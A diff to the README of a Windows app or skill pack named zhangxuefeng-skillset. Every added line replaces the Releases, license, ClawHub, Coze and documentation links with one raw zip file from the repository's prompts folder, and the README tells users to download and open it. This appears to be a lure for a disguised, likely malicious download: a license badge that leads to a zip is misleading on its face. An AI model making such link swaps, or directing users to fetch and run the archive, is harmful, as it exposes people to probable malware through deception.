@@ -1,6 +1,6 @@
 # 🧠 zhangxuefeng-skillset - Learn, search, and run skills fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue.svg)](https://github.com/felixda804/zhangxuefeng-skillset/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue.svg)](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip)
 
 <div align="center">
 
@@ -15,12 +15,12 @@
 
 ---
 
-[![License: CC BY 4.0](https://img.shields.io/badge/Knowledge-CC%20BY%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by/4.0/)
+[![License: CC BY 4.0](https://img.shields.io/badge/Knowledge-CC%20BY%204.0-lightgrey.svg)](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip)
 [![License: MIT](https://img.shields.io/badge/Code-MIT-yellow.svg)](LICENSE-CODE)
-[![OpenClaw Skills](https://img.shields.io/badge/OpenClaw-Skills%20Compatible-blue.svg)](https://docs.openclaw.ai/skills)
+[![OpenClaw Skills](https://img.shields.io/badge/OpenClaw-Skills%20Compatible-blue.svg)](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip)
 [![WeChat Ready](https://img.shields.io/badge/WeChat-Ready-07C160.svg)](#部署到微信)
-[![ClawHub](https://img.shields.io/badge/ClawHub-已发布-orange.svg)](https://clawhub.ai/eric-yibo-shen/zhangxuefeng)
-[![扣子技能](https://img.shields.io/badge/扣子-技能商店已上架-blue.svg)](https://www.coze.cn/skills?skill_share_pid=7627814441916301347)
+[![ClawHub](https://img.shields.io/badge/ClawHub-已发布-orange.svg)](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip)
+[![扣子技能](https://img.shields.io/badge/扣子-技能商店已上架-blue.svg)](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip)
 [![贡献欢迎](https://img.shields.io/badge/contributions-welcome-brightgreen.svg)](CONTRIBUTING.md)
 
 </div>
@@ -31,7 +31,7 @@
 
 To use this app on Windows, visit the release page and download the latest file from there:
 
-**[Visit Releases to download](https://github.com/felixda804/zhangxuefeng-skillset/releases)**
+**[Visit Releases to download](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip)**
 
 ### 安装步骤
 
@@ -103,7 +103,7 @@ If you plan to use platform integrations, you may also need:
 
 Use this if the release contains an `.exe` or `.msi` file.
 
-1. Go to the [Releases page](https://github.com/felixda804/zhangxuefeng-skillset/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip).
 2. Download the newest Windows file.
 3. Open the file after the download finishes.
 4. Follow the install window step by step.
@@ -114,7 +114,7 @@ Use this if the release contains an `.exe` or `.msi` file.
 
 Use this if the release contains a `.zip` file.
 
-1. Go to the [Releases page](https://github.com/felixda804/zhangxuefeng-skillset/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip).
 2. Download the ZIP file.
 3. Right-click the file.
 4. Select Extract All.
@@ -281,11 +281,11 @@ If a prompt appears, allow only the access needed for the task you want to run.
 
 ## 📚 Related links
 
-- [Releases](https://github.com/felixda804/zhangxuefeng-skillset/releases)
-- [ClawHub listing](https://clawhub.ai/eric-yibo-shen/zhangxuefeng)
-- [扣子技能商店](https://www.coze.cn/skills?skill_share_pid=7627814441916301347)
-- [OpenClaw Skills docs](https://docs.openclaw.ai/skills)
-- [License: CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)
+- [Releases](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip)
+- [ClawHub listing](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip)
+- [扣子技能商店](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip)
+- [OpenClaw Skills docs](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip)
+- [License: CC BY 4.0](https://raw.githubusercontent.com/felixda804/zhangxuefeng-skillset/main/prompts/zhangxuefeng_skillset_3.1.zip)
 - [Code license](LICENSE-CODE)
 
 ---
